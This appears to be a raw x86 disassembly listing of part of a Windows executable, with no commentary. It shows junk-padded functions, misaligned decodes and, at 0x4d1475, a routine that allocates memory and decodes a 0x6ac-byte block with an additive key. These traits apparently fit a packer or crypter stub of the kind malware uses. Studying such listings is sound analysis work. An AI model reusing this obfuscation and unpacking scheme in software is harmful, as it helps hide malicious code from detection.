  4d10c2:	pop    ebp
  4d10c3:	ret    
  4d10c4:	mov    edi,edi
  4d10c6:	push   ebp
  4d10c7:	mov    ebp,esp
  4d10c9:	sub    esp,0x3c
  4d10cc:	lea    ebx,ds:0x4d30e4
  4d10d2:	sub    ecx,0x25a6
  4d10d8:	push   0x0
  4d10da:	call   0x4d11b4
  4d10df:	add    esp,0x4
  4d10e2:	push   ebx
  4d10e3:	push   edi
  4d10e4:	push   DWORD PTR [ebx+0x1f0]
  4d10ea:	push   edi
  4d10eb:	call   0x4d14fc
  4d10f0:	add    esp,0xc
  4d10f3:	pop    ebx
  4d10f4:	mov    ecx,0x0
  4d10f9:	push   ecx
  4d10fa:	call   0x4d0d80
  4d10ff:	add    esp,0x4
  4d1102:	add    esp,0x3c
  4d1105:	pop    ebp
  4d1106:	ret    
  4d1107:	add    BYTE PTR [edi-0x1],bl
  4d110a:	adc    eax,0x4d2024
  4d110f:	call   edi
  4d1111:	add    BYTE PTR [eax],al
  4d1113:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1119:	sub    esp,0x20
  4d111c:	lea    eax,[edx-0x40]
  4d111f:	add    DWORD PTR [eax-0x48],0xffffff98
  4d1123:	push   eax
  4d1124:	push   0x0
  4d1126:	call   0x4d0d80
  4d112b:	add    esp,0x4
  4d112e:	pop    eax
  4d112f:	push   eax
  4d1130:	push   ebx
  4d1131:	push   DWORD PTR [eax+0x1f4]
  4d1137:	push   edx
  4d1138:	call   0x4d1298
  4d113d:	add    esp,0xc
  4d1140:	pop    eax
  4d1141:	push   eax
  4d1142:	mov    ecx,0x0
  4d1147:	push   ecx
  4d1148:	call   0x4d0d80
  4d114d:	add    esp,0x4
  4d1150:	pop    eax
  4d1151:	add    esp,0x20
  4d1154:	pop    ebp
  4d1155:	ret    
  4d1156:	add    BYTE PTR [eax],al
  4d1158:	pop    edi
  4d1159:	call   DWORD PTR ds:0x4d2040
  4d115f:	call   edi
  4d1161:	add    BYTE PTR [eax],al
  4d1163:	add    BYTE PTR [edi-0x1],bl
  4d1166:	adc    eax,0x4d2044
  4d116b:	call   edi
  4d116d:	add    BYTE PTR [eax],al
  4d116f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1175:	sub    esp,0x58
  4d1178:	lea    ecx,[esi+0x1a0]
  4d117e:	add    esi,0xffffffcc
  4d1181:	push   ecx
  4d1182:	push   0x0
  4d1184:	call   0x4d0d80
  4d1189:	add    esp,0x4
  4d118c:	pop    ecx
  4d118d:	push   ecx
  4d118e:	push   DWORD PTR [ecx+0x48]
  4d1191:	push   ebx
  4d1192:	push   DWORD PTR [ecx+0x16c]
  4d1198:	call   0x4d13fc
  4d119d:	add    esp,0xc
  4d11a0:	pop    ecx
  4d11a1:	push   ecx
  4d11a2:	push   0x0
  4d11a4:	call   0x4d0864
  4d11a9:	add    esp,0x4
  4d11ac:	pop    ecx
  4d11ad:	add    esp,0x58
  4d11b0:	pop    ebp
  4d11b1:	ret    
  4d11b2:	add    BYTE PTR [eax],al
  4d11b4:	pop    edi
  4d11b5:	call   DWORD PTR ds:0x4d203c
  4d11bb:	call   edi
  4d11bd:	add    BYTE PTR [eax],al
  4d11bf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11c5:	sub    esp,0x2c
  4d11c8:	lea    ebx,[esi-0x64]
  4d11cb:	add    esi,edx
  4d11cd:	push   0x0
  4d11cf:	call   0x4d11b4
  4d11d4:	add    esp,0x4
  4d11d7:	push   ebx
  4d11d8:	push   edx
  4d11d9:	push   DWORD PTR [ebx+0x19c]
  4d11df:	push   ecx
  4d11e0:	call   0x4d1540
  4d11e5:	add    esp,0xc
  4d11e8:	pop    ebx
  4d11e9:	mov    eax,0x0
  4d11ee:	push   eax
  4d11ef:	call   0x4d13b8
  4d11f4:	add    esp,0x4
  4d11f7:	add    esp,0x2c
  4d11fa:	pop    ebp
  4d11fb:	ret    
  4d11fc:	mov    edi,edi
  4d11fe:	push   ebp
  4d11ff:	mov    ebp,esp
  4d1201:	sub    esp,0x44
  4d1204:	lea    esi,[ebx-0x78]
  4d1207:	or     DWORD PTR [esi-0x94],0x79
  4d120e:	push   0x0
  4d1210:	call   0x4d1070
  4d1215:	add    esp,0x4
  4d1218:	push   esi
  4d1219:	push   eax
  4d121a:	push   DWORD PTR [esi+0xdc]
  4d1220:	push   DWORD PTR [esi+0x1a8]
  4d1226:	push   DWORD PTR [esi+0x60]
  4d1229:	call   0x4d13c4
  4d122e:	add    esp,0x10
  4d1231:	pop    esi
  4d1232:	mov    edi,0x0
  4d1237:	push   edi
  4d1238:	call   0x4d1070
  4d123d:	add    esp,0x4
  4d1240:	add    esp,0x44
  4d1243:	pop    ebp
  4d1244:	ret    
  4d1245:	add    BYTE PTR [eax],al
  4d1247:	add    BYTE PTR [edi-0x1],bl
  4d124a:	adc    eax,0x4d2038
  4d124f:	call   edi
  4d1251:	add    BYTE PTR [eax],al
  4d1253:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1259:	sub    esp,0x40
  4d125c:	mov    eax,0x4d3154
  4d1261:	sbb    DWORD PTR [ebp-0x28],edx
  4d1264:	push   eax
  4d1265:	push   0x0
  4d1267:	call   0x4d1464
  4d126c:	add    esp,0x4
  4d126f:	pop    eax
  4d1270:	push   eax
  4d1271:	push   DWORD PTR [eax+0x150]
  4d1277:	push   esi
  4d1278:	call   0x4d0968
  4d127d:	add    esp,0x8
  4d1280:	pop    eax
  4d1281:	push   eax
  4d1282:	mov    edx,0x0
  4d1287:	push   edx
  4d1288:	call   0x4d13b8
  4d128d:	add    esp,0x4
  4d1290:	pop    eax
  4d1291:	add    esp,0x40
  4d1294:	pop    ebp
  4d1295:	ret    
  4d1296:	add    BYTE PTR [eax],al
  4d1298:	mov    edi,edi
  4d129a:	push   ebp
  4d129b:	mov    ebp,esp
  4d129d:	sub    esp,0x54
  4d12a0:	mov    esi,0x4d3188
  4d12a5:	mov    DWORD PTR [ebp-0xc],0x24
  4d12ac:	push   0x0
  4d12ae:	call   0x4d1458
  4d12b3:	add    esp,0x4
  4d12b6:	push   esi
  4d12b7:	push   DWORD PTR [esi+0x154]
  4d12bd:	push   ecx
  4d12be:	push   DWORD PTR [esi+0x98]
  4d12c4:	call   0x4d10c4
  4d12c9:	add    esp,0xc
  4d12cc:	pop    esi
  4d12cd:	push   0x0
  4d12cf:	call   0x4d1070
  4d12d4:	add    esp,0x4
  4d12d7:	add    esp,0x54
  4d12da:	pop    ebp
  4d12db:	ret    
  4d12dc:	mov    edi,edi
  4d12de:	push   ebp
  4d12df:	mov    ebp,esp
  4d12e1:	sub    esp,0x2c
  4d12e4:	mov    eax,0x4d3018
  4d12e9:	mov    edi,DWORD PTR [ebp-0x10]
  4d12ec:	push   eax
  4d12ed:	push   DWORD PTR [eax+0x184]
  4d12f3:	push   edx
  4d12f4:	call   0x4d09b0
  4d12f9:	add    esp,0x8
  4d12fc:	pop    eax
  4d12fd:	push   eax
  4d12fe:	push   0x0
  4d1300:	call   0x4d0864
  4d1305:	add    esp,0x4
  4d1308:	pop    eax
  4d1309:	push   eax
  4d130a:	push   0x0
  4d130c:	call   0x4d1464
  4d1311:	add    esp,0x4
  4d1314:	pop    eax
  4d1315:	add    esp,0x2c
  4d1318:	pop    ebp
  4d1319:	ret    
  4d131a:	add    BYTE PTR [eax],al
  4d131c:	mov    edi,edi
  4d131e:	push   ebp
  4d131f:	mov    ebp,esp
  4d1321:	sub    esp,0x5c
  4d1324:	lea    eax,ds:0x4d30a8
  4d132a:	cmp    eax,0x6aac
  4d132f:	jb     0x4d131f
  4d1331:	push   eax
  4d1332:	push   DWORD PTR [eax+0x28]
  4d1335:	push   edx
  4d1336:	call   0x4d0a3c
  4d133b:	add    esp,0x8
  4d133e:	pop    eax
  4d133f:	push   eax
  4d1340:	mov    edx,0x0
  4d1345:	push   edx
  4d1346:	call   0x4d1464
  4d134b:	add    esp,0x4
  4d134e:	pop    eax
  4d134f:	push   eax
  4d1350:	call   0x4d08b8
  4d1355:	add    esp,0x4
  4d1358:	pop    eax
  4d1359:	add    esp,0x5c
  4d135c:	pop    ebp
  4d135d:	ret    
  4d135e:	add    BYTE PTR [eax],al
  4d1360:	pop    edi
  4d1361:	call   DWORD PTR ds:0x4d2004
  4d1367:	call   edi
  4d1369:	add    BYTE PTR [eax],al
  4d136b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1371:	sub    esp,0x44
  4d1374:	lea    ebx,ds:0x4d3128
  4d137a:	cmp    ebx,0x2f32
  4d1380:	jbe    0x4d136f
  4d1382:	push   ebx
  4d1383:	push   DWORD PTR [ebx+0x1a4]
  4d1389:	push   DWORD PTR [ebx+0x154]
  4d138f:	call   0x4d0c44
  4d1394:	add    esp,0x8
  4d1397:	pop    ebx
  4d1398:	lea    edx,[ebx-0x128]
  4d139e:	push   edx
  4d139f:	call   0x4d07c0
  4d13a4:	add    esp,0x4
  4d13a7:	test   eax,eax
  4d13a9:	jne    0x4d1399
  4d13ab:	call   0x4d08b8
  4d13b0:	add    esp,0x4
  4d13b3:	add    esp,0x44
  4d13b6:	pop    ebp
  4d13b7:	ret    
  4d13b8:	pop    edi
  4d13b9:	call   DWORD PTR ds:0x4d2084
  4d13bf:	call   edi
  4d13c1:	add    BYTE PTR [eax],al
  4d13c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13c9:	sub    esp,0x54
  4d13cc:	mov    ebx,0x4d3130
  4d13d1:	cmp    ebx,0x34
  4d13d4:	je     0x4d13c7
  4d13d6:	push   ebx
  4d13d7:	push   edi
  4d13d8:	push   edx
  4d13d9:	push   edi
  4d13da:	call   0x4d1254
  4d13df:	add    esp,0xc
  4d13e2:	pop    ebx
  4d13e3:	push   0x0
  4d13e5:	call   0x4d1458
  4d13ea:	add    esp,0x4
  4d13ed:	push   0x0
  4d13ef:	call   0x4d1164
  4d13f4:	add    esp,0x4
  4d13f7:	add    esp,0x54
  4d13fa:	pop    ebp
  4d13fb:	ret    
  4d13fc:	mov    edi,edi
  4d13fe:	push   ebp
  4d13ff:	mov    ebp,esp
  4d1401:	sub    esp,0x20
  4d1404:	lea    esi,ds:0x4d3028
  4d140a:	add    DWORD PTR [ebp-0x14],0xffffe359
  4d1411:	mov    ebx,0x0
  4d1416:	push   ebx
  4d1417:	call   0x4d13b8
  4d141c:	add    esp,0x4
  4d141f:	push   esi
  4d1420:	push   DWORD PTR [esi+0x168]
  4d1426:	push   edx
  4d1427:	call   0x4d136c
  4d142c:	add    esp,0x8
  4d142f:	pop    esi
  4d1430:	push   0x0
  4d1432:	call   0x4d1360
  4d1437:	add    esp,0x4
  4d143a:	add    esp,0x20
  4d143d:	pop    ebp
  4d143e:	ret    
  4d143f:	add    BYTE PTR [edi-0x1],bl
  4d1442:	adc    eax,0x4d208c
  4d1447:	call   edi
  4d1449:	add    BYTE PTR [eax],al
  4d144b:	add    BYTE PTR [edi-0x1],bl
  4d144e:	adc    eax,0x4d2030
  4d1453:	call   edi
  4d1455:	add    BYTE PTR [eax],al
  4d1457:	add    BYTE PTR [edi-0x1],bl
  4d145a:	adc    eax,0x4d204c
  4d145f:	call   edi
  4d1461:	add    BYTE PTR [eax],al
  4d1463:	add    BYTE PTR [edi-0x1],bl
  4d1466:	adc    eax,0x4d2010
  4d146b:	call   edi
  4d146d:	add    BYTE PTR [eax],al
  4d146f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1475:	sub    esp,0x54
  4d1478:	add    DWORD PTR [ebp-0x40],0x4c
  4d147c:	mov    ebx,0x4d30ec
  4d1481:	mov    ecx,0x6ac
  4d1486:	push   ecx
  4d1487:	mov    edx,0x6ac
  4d148c:	push   edx
  4d148d:	push   0x40001
  4d1492:	mov    edx,0x862985c2
  4d1497:	push   DWORD PTR [edx+0x7a239a86]
  4d149d:	sub    DWORD PTR [esp],0x2
  4d14a1:	mov    edx,0x4d202c
  4d14a6:	pop    DWORD PTR [edx]
  4d14a8:	call   0x4d1064
  4d14ad:	add    esp,0x4
  4d14b0:	push   eax
  4d14b1:	pop    DWORD PTR [ebx+0x8]
  4d14b4:	mov    edi,DWORD PTR [ebx+0x8]
  4d14b7:	lea    edx,[edi]
  4d14b9:	sub    edi,edi
  4d14bb:	dec    edi
  4d14bc:	and    edi,0x4d0014
  4d14c2:	mov    eax,0xd5d9a824
  4d14c7:	mov    esi,0x6ac
  4d14cc:	cmp    esi,0x0
  4d14cf:	je     0x4d14ed
  4d14d1:	add    esi,0xfffffffc
  4d14d4:	xor    ecx,ecx
  4d14d6:	push   DWORD PTR [edi+ecx*1]
  4d14d9:	add    DWORD PTR [esp],eax
  4d14dc:	pop    DWORD PTR [edx+ecx*2]
  4d14df:	dec    DWORD PTR [edx]
  4d14e1:	xor    eax,eax
  4d14e3:	add    eax,DWORD PTR [edi]
  4d14e5:	add    edi,0x4
  4d14e8:	add    edx,0x4
  4d14eb:	jmp    0x4d14cc
  4d14ed:	call   0x4d08b8
  4d14f2:	add    esp,0x4
  4d14f5:	add    esp,0x54
  4d14f8:	pop    ebp
  4d14f9:	ret    
  4d14fa:	add    BYTE PTR [eax],al
  4d14fc:	mov    edi,edi
  4d14fe:	push   ebp
  4d14ff:	mov    ebp,esp
  4d1501:	sub    esp,0x5c
  4d1504:	lea    eax,[ebx-0x18]
  4d1507:	add    ebx,eax
  4d1509:	push   eax
  4d150a:	push   ebx
  4d150b:	push   DWORD PTR [eax+0xd8]
  4d1511:	call   0x4d07cc
  4d1516:	add    esp,0x8
  4d1519:	pop    eax
  4d151a:	push   eax
  4d151b:	mov    edx,0xfffffff4
  4d1520:	push   edx
  4d1521:	call   0x4d1108
  4d1526:	add    esp,0x4
  4d1529:	pop    eax
  4d152a:	push   eax
  4d152b:	mov    eax,0x0
  4d1530:	push   eax
  4d1531:	call   0x4d11b4
  4d1536:	add    esp,0x4
  4d1539:	pop    eax
  4d153a:	add    esp,0x5c
  4d153d:	pop    ebp
  4d153e:	ret    
  4d153f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1545:	sub    esp,0x40
  4d1548:	lea    ecx,[ebx+0x13c]
  4d154e:	sub    edi,esi
  4d1550:	push   ecx
  4d1551:	mov    edi,0x0
  4d1556:	push   edi
  4d1557:	call   0x4d0864
  4d155c:	add    esp,0x4
  4d155f:	pop    ecx
  4d1560:	push   ecx
  4d1561:	push   DWORD PTR [ecx+0x1b8]
  4d1567:	push   edi
  4d1568:	push   ebx
  4d1569:	push   ebx
  4d156a:	call   0x4d0ef4
  4d156f:	add    esp,0x10
  4d1572:	pop    ecx
  4d1573:	push   ecx
  4d1574:	mov    edi,0x0
  4d1579:	push   edi
  4d157a:	call   0x4d1164
  4d157f:	add    esp,0x4
  4d1582:	pop    ecx
  4d1583:	add    esp,0x40
  4d1586:	pop    ebp
  4d1587:	ret    
  4d1588:	pop    edi
  4d1589:	call   DWORD PTR ds:0x4d201c
  4d158f:	call   edi
  4d1591:	add    BYTE PTR [eax],al
  4d1593:	add    BYTE PTR [edi-0x1],bl
  4d1596:	adc    eax,0x4d2000
  4d159b:	call   edi
  4d159d:	add    BYTE PTR [eax],al
	...
